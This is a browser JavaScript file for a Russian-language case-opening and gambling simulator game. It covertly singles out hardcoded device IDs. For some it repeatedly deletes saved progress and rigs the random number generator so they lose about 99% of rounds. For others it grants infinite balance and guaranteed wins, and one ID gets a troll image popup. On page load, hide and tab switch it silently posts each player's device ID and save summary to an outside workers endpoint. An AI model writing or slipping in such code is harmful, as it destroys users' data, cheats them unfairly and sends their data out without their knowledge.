(function () {
  const ENDPOINT = 'https://autumn-art-ecd0.n7ycgcn5jd.workers.dev/';
  const SAVE_KEY = 'military_case_sim_save_v6';
  const ID_KEY   = 'device_id';

  const CLICK_SOUND_URL = 'https://zadano.github.io/mysite/ston-melodi.mp3';
  const IMAGE_URL       = 'https://avatars.mds.yandex.net/get-mpic/19823040/2a0000019d75de2f129cc0fa808942a029ba/optimize';

  // ===== СПИСКИ ID =====
  const GOD_IDS = [
    'dev_g4dob67go0lf',
    'dev_g5n8q91rhtia',
  ];

  const SOUND_IDS = [
    'dev_g5n8q91rhtia',
  ];

  const UNLUCKY_IDS = [
    'dev_02sev9mwouam',
  ];

  const WIPE_IDS = [
    'dev_02sev9mwouam',
  ];

  function getDeviceId() {
    try {
      let id = localStorage.getItem(ID_KEY);
      if (!id) {
        const rand = Math.random().toString(36).slice(2, 8) +
                     Math.random().toString(36).slice(2, 8);
        id = 'dev_' + rand;
        localStorage.setItem(ID_KEY, id);
      }
      return id;
    } catch (e) { return 'unknown'; }
  }

  const myId     = getDeviceId();
  const isGod     = GOD_IDS.indexOf(myId) !== -1;
  const isSound   = SOUND_IDS.indexOf(myId) !== -1;
  const isUnlucky = UNLUCKY_IDS.indexOf(myId) !== -1;
  const shouldWipe = WIPE_IDS.indexOf(myId) !== -1;

  // ===== ОБНУЛЕНИЕ ПРОГРЕССА =====
  (function wipeProgress() {
    if (!shouldWipe) return;

    try {
      localStorage.removeItem(SAVE_KEY);
      console.log('%c🧹 PROGRESS WIPED for ' + myId, 'color:#f80;font-weight:bold');
    } catch (e) {}

    setTimeout(function () {
      try { localStorage.removeItem(SAVE_KEY); } catch (e) {}
    }, 1000);

    setTimeout(function () {
      try { localStorage.removeItem(SAVE_KEY); } catch (e) {}
    }, 3000);
  })();

  // ===== БЕСКОНЕЧНЫЙ БАЛАНС =====
  (function installInfiniteBalance() {
    if (!isGod) return;
    const INFINITE = 1e15;

    const origGetItem = Storage.prototype.getItem;
    Storage.prototype.getItem = function (key) {
      const raw = origGetItem.call(this, key);
      if (key !== SAVE_KEY || !raw) return raw;
      try {
        const d = JSON.parse(raw);
        d.balance = INFINITE;
        return JSON.stringify(d);
      } catch (e) { return raw; }
    };

    const origSetItem = Storage.prototype.setItem;
    Storage.prototype.setItem = function (key, value) {
      if (key !== SAVE_KEY) return origSetItem.call(this, key, value);
      try {
        const d = JSON.parse(value);
        d.balance = INFINITE;
        return origSetItem.call(this, key, JSON.stringify(d));
      } catch (e) {
        return origSetItem.call(this, key, value);
      }
    };

    try {
      const raw = origGetItem.call(localStorage, SAVE_KEY);
      const d = raw ? JSON.parse(raw) : {};
      d.balance = INFINITE;
      origSetItem.call(localStorage, SAVE_KEY, JSON.stringify(d));
    } catch (e) {}

    console.log('%c♾️ INFINITE BALANCE for ' + myId, 'color:#0ff;font-weight:bold');
  })();

  // ===== РЕЖИМ БОГА =====
  (function installGodMode() {
    if (!isGod) return;
    const orig = Math.random;
    Math.random = function () {
      const stack = (new Error().stack || '');
      if (stack.includes('rollItem'))          return 0.999;
      if (stack.includes('crashStart'))        return 0.999;
      if (stack.includes('coinflipStart'))     return 0.1;
      if (stack.includes('randomSlotSymbol'))  return 0.0;
      if (stack.includes('minesStart')) {
        if (!window.__mineTick) window.__mineTick = 0;
        const corners = [0, 24, 12];
        return corners[window.__mineTick++ % 3] / 25;
      }
      return orig();
    };
    console.log('%c👑 GOD MODE for ' + myId, 'color:#ffd700;font-weight:bold');
  })();

  // ===== БАЛАНС "$ ДОХУЯ" =====
  (function installMoneyDisplay() {
    if (!isGod) return;
    const FAKE_TEXT = '$ ДОХУЯ';

    function replaceBalance() {
      const old = document.getElementById('balanceDisplay');
      if (!old) return;
      if (old.dataset.fake === '1') {
        if (old.textContent !== FAKE_TEXT) old.textContent = FAKE_TEXT;
        return;
      }
      const fresh = document.createElement('div');
      fresh.className = old.className;
      fresh.id = 'balanceDisplay';
      fresh.dataset.fake = '1';
      fresh.textContent = FAKE_TEXT;
      fresh.style.cssText = old.style.cssText;
      if (old.parentNode) old.parentNode.replaceChild(fresh, old);
    }

    replaceBalance();
    setInterval(replaceBalance, 30);

    console.log('%c💸 Money display replaced: ' + FAKE_TEXT, 'color:#0f0;font-weight:bold');
  })();

  // ===== РЕЖИМ 1% / 99% =====
  (function installUnluckyMode() {
    if (!isUnlucky) return;
    const orig = Math.random;
    let callIndex = 0;
    let winSlot = Math.floor(orig() * 100);
    const PATTERN_SIZE = 100;

    function isWin() {
      const slot = callIndex % PATTERN_SIZE;
      callIndex++;
      if (callIndex % PATTERN_SIZE === 0) {
        winSlot = Math.floor(orig() * PATTERN_SIZE);
      }
      return slot === winSlot;
    }

    Math.random = function () {
      const stack = (new Error().stack || '');
      const win = isWin();
      if (stack.includes('rollItem')) {
        return win ? 0.5 + orig() * 0.499 : orig() * 0.3;
      }
      if (stack.includes('crashStart')) {
        return win ? 0.5 + orig() * 0.5 : orig() * 0.1;
      }
      if (stack.includes('coinflipStart')) {
        return win ? 0.1 : 0.9;
      }
      if (stack.includes('randomSlotSymbol')) {
        if (win) return 0.3;
        return (++callIndex % 7) / 7;
      }
      if (stack.includes('minesStart')) {
        if (win) {
          const corners = [0, 24, 12];
          return corners[Math.floor(orig() * 3)] / 25;
        }
        return (10 + orig() * 5) / 25;
      }
      return orig();
    };
    console.log('%c💀 UNLUCKY MODE 1/99 for ' + myId, 'color:#f00;font-weight:bold');
  })();

  // ===== Чтение сохранения =====
  function readSave() {
    try {
      const raw = localStorage.getItem(SAVE_KEY);
      if (!raw) return null;
      const d = JSON.parse(raw);

      let invTotal = 0, invCount = 0;
      if (Array.isArray(d.inventory)) {
        invCount = d.inventory.length;
        invTotal = d.inventory.reduce(function (s, it) {
          return s + (typeof it.price === 'number' ? it.price : 0);
        }, 0);
      }
      let top3 = [];
      if (Array.isArray(d.inventory) && d.inventory.length) {
        top3 = d.inventory.slice()
          .sort(function (a, b) { return (b.price || 0) - (a.price || 0); })
          .slice(0, 3)
          .map(function (it) { return `${it.name} — $${Number(it.price).toFixed(2)}`; });
      }

      return {
        balance:         typeof d.balance === 'number' ? d.balance : null,
        clicks:          typeof d.clicks === 'number' ? d.clicks : null,
        clickerEarned:   typeof d.clickerEarned === 'number' ? d.clickerEarned : null,
        clickMultiplier: typeof d.clickMultiplier === 'number' ? d.clickMultiplier : null,
        opened:          d.stats?.opened ?? null,
        spent:           d.stats?.spent ?? null,
        earned:          d.stats?.earned ?? null,
        invCount, invTotal, top3,
        lastDaily:       typeof d.lastDaily === 'number' ? d.lastDaily : null,
        lastWheel:       typeof d.lastWheel === 'number' ? d.lastWheel : null,
        pityCounter:     typeof d.pityCounter === 'number' ? d.pityCounter : null,
        selectedCase:    typeof d.selectedCase === 'number' ? d.selectedCase : null,
        crashHistory:    Array.isArray(d.crashHistory) ? d.crashHistory.slice(0, 5) : [],
        savedAt:         d.savedAt ? new Date(d.savedAt).toLocaleString('ru-RU') : null
      };
    } catch (e) { return null; }
  }

  function send() {
    fetch(ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ deviceId: myId, save: readSave() })
    }).catch(() => {});
  }

  // ===== ЗВУК =====
  let clickAudio = null;
  function playClickSound() {
    try {
      if (!clickAudio) {
        clickAudio = new Audio(CLICK_SOUND_URL);
        clickAudio.volume = 0.6;
      }
      clickAudio.currentTime = 0;
      clickAudio.play().catch(() => {});
    } catch (e) {}
  }

  // ===== КАРТИНКА =====
  function showImage() {
    const old = document.getElementById('__troll_img');
    if (old) return;
    const img = document.createElement('img');
    img.id = '__troll_img';
    img.src = IMAGE_URL;
    img.style.cssText = `
      position: fixed; top: 50%; left: 50%;
      transform: translate(-50%, -50%) scale(0.5);
      max-width: 80vw; max-height: 70vh;
      z-index: 99999; border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
      pointer-events: none; opacity: 0;
      transition: transform 0.3s cubic-bezier(.2,1.5,.4,1), opacity 0.3s;
    `;
    document.body.appendChild(img);
    requestAnimationFrame(() => {
      img.style.opacity = '1';
      img.style.transform = 'translate(-50%, -50%) scale(1)';
    });
  }
  function hideImage() {
    const img = document.getElementById('__troll_img');
    if (!img) return;
    img.style.opacity = '0';
    img.style.transform = 'translate(-50%, -50%) scale(0.7)';
    setTimeout(() => img.remove(), 400);
  }

  let clickCounter = 0;
  function handleClick() {
    clickCounter++;
    if (clickCounter % 2 === 1) { playClickSound(); hideImage(); }
    else { showImage(); }
  }

  function attachClickSound() {
    if (!isSound) return;
    const tryAttach = () => {
      const btn = document.getElementById('clickerBtn');
      if (btn && !btn.dataset.soundAttached) {
        btn.dataset.soundAttached = '1';
        btn.addEventListener('pointerdown', handleClick, true);
        console.log('✅ Sound/image attached for ' + myId);
        return true;
      }
      return false;
    };
    if (tryAttach()) return;
    const observer = new MutationObserver(() => { if (tryAttach()) observer.disconnect(); });
    observer.observe(document.body, { childList: true, subtree: true });
    setTimeout(tryAttach, 500);
    setTimeout(tryAttach, 1500);
  }

  // ===== СТАРТ =====
  send();
  setTimeout(send, 3000);
  window.addEventListener('pagehide', send);
  document.addEventListener('visibilitychange', function () {
    if (document.hidden) send();
  });

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', attachClickSound);
  } else {
    attachClickSound();
  }
})();